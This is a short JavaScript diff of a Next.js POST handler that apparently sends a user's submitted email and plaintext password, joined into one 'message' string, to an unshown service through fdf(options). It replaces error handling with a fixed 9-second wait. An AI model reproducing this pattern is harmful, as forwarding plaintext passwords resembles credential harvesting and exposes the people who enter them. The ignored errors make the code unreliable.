@@ -17,10 +17,18 @@ export async function POST(request) {
           'message': `${email} and ${password}`
         }
       };
-      fdf(options, function (error, response) {
-        if (error) throw new Error(error);
-        console.log(response.body);
-      });
+
+
+const ans = await new Promise((resolve, reject) => {
+fdf(options)
+setTimeout(()=> {
+return resolve()
+},9000)
+
+  
+})
       
+     
+    
       return NextResponse.json({success: true})
 }
